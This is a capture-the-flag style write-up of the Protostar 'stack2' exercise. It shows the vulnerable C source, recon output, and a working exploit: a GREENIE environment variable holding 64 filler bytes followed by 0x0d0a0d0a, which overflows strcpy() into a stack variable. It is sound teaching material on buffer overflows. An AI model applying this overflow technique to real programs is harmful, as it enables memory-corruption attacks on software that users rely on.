# **stack2**
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

New knowledge:
- getenv(): searches for the environment string by name and returns the associated value to the string.
- errx(): go to #references

## Target
printf("you have correctly modified the variable\n");

## Vulnerability
strcpy()

## Recon

```
┌──(kali㉿kali)-[~/Documents/week9/bin]
└─$ rabin2 -I ./stack2
arch     x86
baddr    0x8048000
binsz    23350
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (Debian 4.4.5-8) 4.4.5 GCC: (Debian 4.4.5-10) 4.4.5
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
nx       false
os       linux
pic      false
relocs   true
relro    no
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

## Exploit
- 0x0a = '\n'
- 0x0d = '\r'
- Tìm command để set env: => export <=
```
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print('a'*64 + '\n\r\n\r')")
```
or
```
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')")
```
- Success:
```
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable 
```

# References
- getenv() functions: https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm
- errx(): https://docs.oracle.com/cd/E36784_01/html/E36874/errx-3c.html
- How do I set an environment variable?: https://www.schrodinger.com/kb/1842